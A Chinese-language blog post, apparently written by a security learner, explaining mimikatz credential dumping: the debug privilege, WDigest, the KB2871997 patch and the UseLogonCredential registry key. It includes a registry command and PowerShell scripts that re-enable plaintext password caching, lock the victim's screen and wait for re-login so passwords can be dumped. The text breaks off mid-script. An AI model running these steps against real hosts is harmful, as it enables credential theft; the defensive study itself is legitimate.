## Preface
前不久在使用mimikatz抓取hash的时候遇到了报错，本着追根溯源的原则去查看了mimikatz抓取密码的原理。在学习的过程中发现了mimikatz的每种报错都有不同的原因，本文就记录一下自己的学习过程，从mimikatz的防御角度出发来分析如何防御mimikatz抓取密码。
## Debug Privilege
这里先放一个微软官方对调试权限的解释：
> 调试权限允许某人调试他们原本无权访问的进程。例如，以在其令牌上启用调试权限的用户身份运行的进程可以调试作为本地系统运行的服务。
>
>
> 调试权限是一种安全策略设置，允许用户将调试器附加到进程或内核。管理员可以修改用户组的安全策略以包含或删除此功能。正在调试自己的应用程序的开发人员不需要此用户权限。调试系统组件或调试远程组件的开发人员将需要此用户权限。此用户权限提供对敏感和关键操作系统组件的完全访问权限。默认情况下，为具有管理员权限的用户启用此属性。具有管理员权限的用户可以为其他用户组启用此属性。
在 windows⾥，调试权限可以⽤来调试进程，甚⾄是调试内核。对于 `mimikatz`
的工作原理必须要读取内存，那么只有它拥有了调试的权限才能去打开进程。所以`mimikatz`能抓取`hash`的一个必要条件拥有调试程序的权限。
默认情况下，本地管理员组是由这个权限的。但是，除非管理员是个程序员，⼀般他应该⽤不到这种权限，因为普通使用电脑的用户一般不会去调试程序。为什么`mimikatz`需要管理员权限才能够抓取`hash`也是这个原因，如果只是一个`user`权限就获得不了调试程序的权限。
本地安全策略是默认给管理员组权限的
在组策略里面也是把调试程序这个权限给了管理员。这里提一个windows的效力位阶，默认情况下，多条策略略不不冲突的情况下，多条策略略是合并的关系；如果冲突的话，优先级高的适用，优先级从低到高分别为
    local policy（本地）－> site policy（站点）－>  domain policy（域）－> ou policy（组织单元）
那么这里在本地和组策略都为把这个权限给了管理员的情况下也不需要使用windows的效力位阶再去分配权限，即`Administrator`权限就能够调试程序
这里在没有更改原始本地策略和组策略的情况下，使用`privilege::debug`提升权限是能够提权成功的
但当我在组策略中将调试程序设为空，即任何权限都不能够调试程序的情况下再去尝试用`privilege::debug`提升权限
发现已经报错，不能提升权限，根本原因就是因为`mimikatz`不能够获取调试权限则不能够提权
## WDigest
何为`WDigest`?
> WDigest即摘要身份验证，摘要身份验证是一种质询/响应协议，主要在 Windows Server 2003 中用于 LDAP 和基于 Web
> 的身份验证。它利用超文本传输协议 (HTTP) 和简单身份验证安全层 (SASL)
> 交换进行身份验证。在较高级别上，客户端请求访问某些内容，身份验证服务器向客户端提出质询，客户端通过使用从密码派生的密钥对其响应进行加密来响应质询。将加密的响应与身份验证服务器上存储的响应进行比较，以确定用户是否具有正确的密码。
`WDigest`有何作用？
> Windows 安全审核应该是每个人的优先事项，了解您的端点的配置方式以及它们可能为恶意用户打开哪些门与保护任何环境都相关。这就是 WDigest
> 发挥作用的地方，与 WDigest 相关的事情是它以明文形式将密码存储在内存中。  
>  如果恶意用户可以访问端点并能够运行像 Mimikatz
> 这样的工具，他们不仅可以获得当前存储在内存中的哈希值，而且还可以获得帐户的明文密码。这显然是一个问题，因为现在他们不仅能够利用像pass-the-> hash这样的攻击，而且他们现在还可以使用用户名和密码来尝试登录 Exchange、内部网站等。
回到`WDigest`在`mimikatz`使用过程中的作用，我们知道`WDigest`利用`HTTP`和`SASL`进行身份验证，具体表现为把明文密码存在`lsass.exe`进程里通过`http`进行认证。这也衍生出了一个问题，一旦攻击者从中利用，就可以获得明文，所以`WDigest`明文传输是极其不安全的。所以在win2008之后的版本`WDigest`是默认不启用的，在win2008之前的版本虽然打开了`WDigest`，但是如果系统上安装了`KB2871997`补丁的话，也不能从中获得明文。
这里说到`KB2871997`补丁补充一个点，我们知道`KB2871997`这个补丁的作用就是关闭`WDigest
Auth`，但是并不是完全关闭。因为某些系统服务(如IIS的SSO身份认证)就需要用到`WDigest
Auth`，所以这里微软选择了一个折中的方法，让用户选择是否关闭`WDigest Auth`，安装补丁之后可以自己选择是否开启`WDigest
Auth`，如果选择开启`WDigest Auth`的话还是会保存明文密码
`KB2871997`对应的注册表键值为`UseLogonCredential`
`WDigest`的注册表位于
    HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest
这里首先看一下没有安装补丁的情况，可以看到这里是没有`UseLogonCredential`这个值的
可以看到这里是抓取得到明文的
这里我到微软官方下载一下补丁
安装完成后发现已经有了这个键值，再尝试用`mimikatz`抓取明文发现已经抓不到了
这里如果要设置为能够重新用`WDigest`存储明文使用命令修改`UseLogonCredential`键值修改为1即可
    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
因为这里锁屏之后要注销后重启才能够抓到明文密码，但是我们在不知道明文的情况下就登陆不了，所以这里就需要考虑如下问题：
    修改注册表
    锁屏
    进入循环，判断当前系统是否结束锁屏状态
    用户登录后，跳出循环等待，立即导出明文口令并保存
所以这里需要实现以下几个步骤，这里因为本人水平有限，所以这个地方参考了三好学生大佬的powershell代码，这里向三好学生大佬表示衷心感谢
  * 使用powershell实现注册表键值修改
修改键值为1
    #!bash
    Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
这里判断注册表键值是否为0，如果为1则等待10s再判断，如果为0则退出循环，可以用来监控注册表键值是否被修改
    #!powershell
    $key=Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" -Name "UseLogonCredential"
    $Flag=$key.UseLogonCredential
    write-host "[+]Checking Flag"
    while($Flag -eq 1)
    {
        write-host "[+]Flag Normal"
        write-host "[+]Wait 10 Seconds..."
        Start-Sleep -Seconds 10
        $key=Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" -Name "UseLogonCredential"
        $Flag=$key.UseLogonCredential
        write-host "[+]Checking Flag"
    }
    write-host "[!]Flag Changed!"
这里使用powershell脚本运行脚本，可以看到在没有修改的情况下是10s刷新一次
    powershell.exe -ExecutionPolicy Bypass -File test.ps1
在修改注册表为0之后脚本停止退出循环
  * 锁屏
正常情况下windows锁屏的快捷键是win+L，但是这里我们如果是在渗透的过程中就不能使用win+L对对方主机进行锁屏，这里就需要使用cmd命令来使对方主机锁屏
cmd命令如下：
    rundll32.exe user32.dll,LockWorkStation
使用powershell实现：
    #!powershell
    Function Lock-WorkStation {
    $signature = @"
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool LockWorkStation();
    "@
    $LockWorkStation = Add-Type -memberDefinition $signature -name "Win32LockWorkStation" -namespace Win32Functions -passthru
    $LockWorkStation::LockWorkStation() | Out-Null
    }
    Lock-WorkStation
    powershell.exe -ExecutionPolicy Bypass -File test2.ps1
  * 判断锁屏状态
这里的思路是通过判断`GetForegroundWindow()`这个函数的返回值来确定是否锁屏。在锁屏状态下`GetForegroundWindow()`这个函数返回值为`NULL`，在非锁屏状态下`GetForegroundWindow()`这个函数返回值为非空。
循环判断当前是否为锁屏状态，如果不是锁屏状态，退出循环，否则循环等待
    #!powershell
    function local:Get-DelegateType {
      Param (
        [OutputType([Type])]
      [Parameter( Position = 0)]
      [Type[]]
      $Parameters = (New-Object Type[](0)),
        [Parameter( Position = 1 )]
      [Type]
      $ReturnType = [Void]
      )
        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)